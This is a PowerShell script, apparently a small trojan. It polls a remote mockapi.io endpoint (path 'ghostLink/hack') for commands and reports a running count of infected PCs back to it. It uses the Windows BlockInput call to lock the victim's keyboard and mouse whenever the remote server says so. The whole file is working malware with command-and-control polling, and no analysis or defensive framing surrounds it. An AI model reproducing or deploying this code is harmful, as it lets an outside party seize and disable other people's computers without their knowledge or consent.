$global:blockUserInput = $null
$global:isActive = $null
$global:lastNbPcInfectIncr = ""
$global:nbPcInfectIncr = $null
$global:isActive = $null

function dataBaseCheck {
    try {
        $response = Invoke-RestMethod -Uri "https://68b82111b71540504327314e.mockapi.io/ghostLink/hack/1" -Method Get -TimeoutSec 5
        Write-Host $response
        if ($response -ne $null) {
            $global:isActive = $response.isActive
            $global:blockUserInput = $response.blockUserInput
            $global:nbPcInfect = $response.nbPcInfect.nbPcInfect
            $global:nbPcInfectIncr = $response.nbPcInfect.nbPcInfectIncr
        } else {
            Write-Warning "API response was null."
            $global:isActive = $null
            $global:blockUserInput = $null
            $global:nbPcInfectIncr = $null
            $global:nbPcInfect = 0
        }
    } catch {
        Write-Error "Error checking database: $($_.Exception.Message)"
        $global:isActive = $null
        $global:blockUserInput = $null
        $global:nbPcInfect = 0
        $global:nbPcInfectIncr = $null
    }
}

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class BlockInputHelper {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}
"@

function Block-UserInput {
    [BlockInputHelper]::BlockInput($true)
}

function Unblock-UserInput {
    [BlockInputHelper]::BlockInput($false)
}

function main {
    while ($true) {
        dataBaseCheck
        if ($null -ne $global:blockUserInput) {
            if ($global:nbPcInfectIncr -ne $global:lastNbPcInfectIncr) {
                $updatedNbPcInfect = $global:nbPcInfect + 1

                $body = @{
                    nbPcInfect = @{
                        nbPcInfect = $updatedNbPcInfect
                        nbPcInfectIncr = $global:lastNbPcInfectIncr
                    }
                } | ConvertTo-Json

                $headers = @{
                    "Content-Type" = "application/json"
                }

                try {
                    $response = Invoke-RestMethod -Uri "https://68b82111b71540504327314e.mockapi.io/ghostLink/hack" `
                                            -Method Put `
                                            -Body $body `
                                            -Headers $headers
                    Write-Host "Updated nbPcInfect to $($updatedNbPcInfect)" -ForegroundColor Green
                    $global:lastNbPcInfectIncr = $global:nbPcInfectIncr
                } catch {
                    Write-Warning "Failed tp update nbPcInfect $($_.Exception.Message)"
                }
            }

            if ($global:blockUserInput) {
                Block-UserInput
            } else {
                Unblock-UserInput
            }
        }
    }
}